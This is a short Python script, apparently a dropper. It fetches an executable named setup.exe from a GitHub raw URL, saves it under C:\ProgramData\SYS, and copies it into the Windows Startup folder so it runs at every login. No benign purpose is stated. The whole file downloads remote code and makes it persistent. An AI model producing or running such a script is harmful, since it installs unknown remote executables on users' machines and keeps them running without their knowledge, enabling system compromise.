import requests
import os
import shutil

import win32api
import winshell

print('Beginning file download with requests')

url = 'https://github.com/MASMob2022/pyw.download/raw/main/setup.exe'
r = requests.get(url)

with open('C:\ProgramData\SYS\setup.exe', 'wb') as f:
    f.write(r.content)

# Retrieve HTTP meta-data
print(r.status_code)
print(r.headers['content-type'])
print(r.encoding)

original = r'C:\ProgramData\SYS\setup.exe'

startup = winshell.startup()+'/setup.exe'
print(winshell.startup())


shutil.copyfile(original, startup)
